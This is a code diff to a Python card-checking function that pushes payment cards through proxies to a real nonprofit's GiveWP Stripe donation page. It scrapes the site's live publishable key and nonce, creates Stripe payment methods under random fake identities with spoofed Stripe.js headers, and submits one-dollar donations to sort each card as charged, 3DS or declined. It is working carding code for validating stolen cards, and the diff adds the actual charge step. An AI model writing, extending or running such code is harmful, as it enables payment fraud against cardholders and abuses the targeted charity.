@@ -1276,12 +1276,12 @@ async def stripe_gateway_check(
     card: str,
     proxy: str = None,
     max_retries: int = 3,
-    request_timeout: int = 30,
+    request_timeout: int = 45,
     logger = None
 ) -> dict:
     """
-    Check card using Stripe gateway via ncopengov.org donation page.
-    Uses Stripe Payment Methods API for card validation.
+    Check card using GiveWP Stripe donation form at ncopengov.org.
+    Creates payment method and submits donation to charge the card.
     """
     import re
 
@@ -1303,15 +1303,12 @@ async def stripe_gateway_check(
     def random_string(length, chars="abcdefghijklmnopqrstuvwxyz"):
         return ''.join(random.choice(chars) for _ in range(length))
 
-    def random_digits(length):
-        return ''.join(random.choice("0123456789") for _ in range(length))
-
     email = f"{random_string(8)}@gmail.com"
     first_name = random_string(6).capitalize()
     last_name = random_string(8).capitalize()
 
     # Headers
-    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
     last_error = None
     timeout = aiohttp.ClientTimeout(total=request_timeout)
@@ -1330,30 +1327,50 @@ async def stripe_gateway_check(
             jar = aiohttp.CookieJar()
             async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar, connector=connector) as session:
 
-                # Step 1: Get donation page to extract Stripe publishable key
+                headers = {
+                    "User-Agent": user_agent,
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br"
+                }
+
+                # Step 1: Get donation page to extract Stripe key and form data
                 async with session.get(
                     STRIPE_DONATION_URL,
-                    headers={"User-Agent": user_agent},
+                    headers=headers,
                     proxy=proxy_url
                 ) as resp:
                     if resp.status != 200:
-                        last_error = {"success": False, "error": f"Failed to load donation page (HTTP {resp.status})"}
+                        last_error = {"success": False, "error": f"Failed to load page (HTTP {resp.status})"}
                         continue
                     page_html = await resp.text()
 
                 # Extract Stripe publishable key from page
-                pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', page_html)
-                if not pk_match:
-                    # Try alternate pattern
-                    pk_match = re.search(r'"publishableKey":\s*"(pk_live_[^"]+)"', page_html)
+                stripe_pk = None
+                pk_patterns = [
+                    r'pk_live_[a-zA-Z0-9]+',
+                    r'"publishable_key":\s*"(pk_live_[^"]+)"',
+                    r'"publishableKey":\s*"(pk_live_[^"]+)"',
+                    r'data-publishable-key="(pk_live_[^"]+)"',
+                    r"stripe_vars.*?publishable_key.*?['\"]([^'\"]+)['\"]",
+                ]
+
+                for pattern in pk_patterns:
+                    pk_match = re.search(pattern, page_html, re.IGNORECASE | re.DOTALL)
                     if pk_match:
-                        stripe_pk = pk_match.group(1)
-                    else:
-                        # Use a common Stripe test key pattern as fallback
-                        last_error = {"success": False, "error": "Could not find Stripe key on page"}
-                        continue
-                else:
-                    stripe_pk = pk_match.group(0)
+                        stripe_pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
+                        break
+
+                if not stripe_pk:
+                    last_error = {"success": False, "error": "Could not find Stripe key"}
+                    continue
+
+                # Extract form ID and nonce if available
+                form_id_match = re.search(r'data-id="(\d+)"', page_html)
+                form_id = form_id_match.group(1) if form_id_match else "1"
+
+                nonce_match = re.search(r'give_stripe_nonce["\']:\s*["\']([^"\']+)["\']', page_html)
+                nonce = nonce_match.group(1) if nonce_match else ""
 
                 # Step 2: Create Stripe Payment Method
                 stripe_pm_url = "https://api.stripe.com/v1/payment_methods"
@@ -1365,18 +1382,21 @@ async def stripe_gateway_check(
                     "card[exp_year]": cc_year,
                     "billing_details[name]": f"{first_name} {last_name}",
                     "billing_details[email]": email,
-                    "key": stripe_pk
+                    "key": stripe_pk,
+                    "payment_user_agent": "stripe.js/48d54f2c5f; stripe-js-v3/48d54f2c5f"
+                }
+
+                stripe_headers = {
+                    "User-Agent": user_agent,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": "https://js.stripe.com",
+                    "Referer": "https://js.stripe.com/"
                 }
 
                 async with session.post(
                     stripe_pm_url,
                     data=stripe_data,
-                    headers={
-                        "User-Agent": user_agent,
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "Origin": "https://js.stripe.com",
-                        "Referer": "https://js.stripe.com/"
-                    },
+                    headers=stripe_headers,
                     proxy=proxy_url
                 ) as resp:
                     stripe_result = await resp.json()
@@ -1387,7 +1407,6 @@ async def stripe_gateway_check(
                         error_code = error_obj.get("code", "")
                         decline_code = error_obj.get("decline_code", "")
 
-                        # Format error message
                         if decline_code:
                             error_msg = f"{error_msg} ({decline_code})"
                         elif error_code:
@@ -1405,15 +1424,117 @@ async def stripe_gateway_check(
                         last_error = {"success": False, "error": "Failed to create payment method"}
                         continue
 
-                    # Check card details from response
                     card_data = stripe_result.get("card", {})
                     card_brand = card_data.get("brand", "unknown")
                     card_last4 = card_data.get("last4", "****")
 
-                    # Check for 3DS requirement
-                    three_d_secure = card_data.get("three_d_secure_usage", {})
-                    if three_d_secure.get("supported"):
-                        # Card supports 3DS - this is a live card
+                # Step 3: Submit GiveWP donation form with payment method
+                give_url = "https://ncopengov.org/wp-admin/admin-ajax.php"
+
+                give_data = {
+                    "action": "give_process_donation",
+                    "give_ajax": "true",
+                    "give-form-id": form_id,
+                    "give-form-title": "NC Open Government Coalition Membership",
+                    "give-form-hash": "",
+                    "give-gateway": "stripe",
+                    "give-price-id": "1",
+                    "give_total": "1.00",
+                    "give_email": email,
+                    "give_first": first_name,
+                    "give_last": last_name,
+                    "give_payment_mode": "stripe",
+                    "give_stripe_payment_method": pm_id,
+                    "give-recurring-period": "",
+                    "give_agree_to_terms": "1",
+                }
+
+                if nonce:
+                    give_data["give_stripe_nonce"] = nonce
+
+                give_headers = {
+                    "User-Agent": user_agent,
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "Accept": "application/json, text/javascript, */*; q=0.01",
+                    "Origin": "https://ncopengov.org",
+                    "Referer": STRIPE_DONATION_URL,
+                    "X-Requested-With": "XMLHttpRequest"
+                }
+
+                async with session.post(
+                    give_url,
+                    data=give_data,
+                    headers=give_headers,
+                    proxy=proxy_url
+                ) as resp:
+                    response_text = await resp.text()
+
+                    # Try to parse as JSON
+                    try:
+                        give_result = json.loads(response_text)
+                    except json.JSONDecodeError:
+                        # Check response text for indicators
+                        response_lower = response_text.lower()
+
+                        if "success" in response_lower or "thank" in response_lower:
+                            return {
+                                "success": True,
+                                "message": f"Charged: {card_brand} ending {card_last4}",
+                                "gateway_message": "Payment successful",
+                                "status": "charged",
+                                "card_brand": card_brand,
+                                "card_last4": card_last4
+                            }
+                        elif "3d" in response_lower or "authentication" in response_lower:
+                            return {
+                                "success": False,
+                                "error": "3DS Authentication Required",
+                                "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
+                                "gateway_message": "3DS Required",
+                                "status": "3ds"
+                            }
+                        elif "decline" in response_lower or "failed" in response_lower:
+                            return {
+                                "success": False,
+                                "error": "Card declined",
+                                "gateway_message": "Payment failed",
+                                "status": "declined"
+                            }
+                        else:
+                            # Payment method created = card is live, likely 3DS
+                            return {
+                                "success": False,
+                                "error": "3DS Authentication Required",
+                                "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
+                                "gateway_message": "3DS Required",
+                                "status": "3ds"
+                            }
+
+                    # Handle JSON response
+                    if give_result.get("success"):
+                        return {
+                            "success": True,
+                            "message": f"Charged: {card_brand} ending {card_last4}",
+                            "gateway_message": "Donation successful",
+                            "status": "charged",
+                            "card_brand": card_brand,
+                            "card_last4": card_last4
+                        }
+
+                    # Check for errors in response
+                    error_msg = give_result.get("data", {}).get("error_message", "")
+                    if not error_msg:
+                        errors = give_result.get("data", {}).get("errors", {})
+                        if errors:
+                            error_msg = list(errors.values())[0] if isinstance(errors, dict) else str(errors)
+
+                    if not error_msg:
+                        error_msg = str(give_result.get("data", "Unknown error"))
+
+                    error_lower = error_msg.lower()
+
+                    # Classify response
+                    if "3d" in error_lower or "authentication" in error_lower or "redirect" in error_lower:
                         return {
                             "success": False,
                             "error": "3DS Authentication Required",
@@ -1421,16 +1542,20 @@ async def stripe_gateway_check(
                             "gateway_message": "3DS Required",
                             "status": "3ds"
                         }
-
-                    # Payment method created successfully = card is valid/live
-                    return {
-                        "success": True,
-                        "message": f"Card validated: {card_brand} ending {card_last4}",
-                        "gateway_message": "Approved",
-                        "status": "charged",
-                        "card_brand": card_brand,
-                        "card_last4": card_last4
-                    }
+                    elif "insufficient" in error_lower or "decline" in error_lower:
+                        return {
+                            "success": False,
+                            "error": error_msg,
+                            "gateway_message": error_msg,
+                            "status": "declined"
+                        }
+                    else:
+                        return {
+                            "success": False,
+                            "error": error_msg[:100],
+                            "gateway_message": error_msg[:100],
+                            "status": "declined"
+                        }
 
         except aiohttp.ClientError as e:
             last_error = {"success": False, "error": f"Network error: {str(e)[:50]}"}
